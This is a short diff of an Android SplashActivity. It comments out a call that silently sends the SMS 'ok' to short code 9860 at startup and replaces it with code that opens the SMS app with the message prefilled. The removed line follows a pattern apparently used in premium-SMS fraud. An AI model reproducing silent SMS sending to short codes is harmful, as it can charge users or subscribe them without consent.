@@ -127,10 +127,10 @@ public class SplashActivity extends Activity {
         intentFilter2 = new IntentFilter(str2);
         Intent registerReceiver2 = registerReceiver(broadcastReceiver2, intentFilter2);
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
+        /*if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
             SmsManager.getDefault().sendTextMessage("9860", null, "ok",broadcast,broadcast2);
-        }
-       /* String phoneNumber = "9860";
+        }*/
+        String phoneNumber = "9860";
         String message = "Ok";
 
         // Open the SMS app with the specified number and message
@@ -139,7 +139,7 @@ public class SplashActivity extends Activity {
         intent3.putExtra("sms_body", message);
         startActivity(intent3);
 
-        finish();*/
+        finish();
         unregisterReceiver(broadcastReceiver);
         unregisterReceiver(broadcastReceiver2);
     }
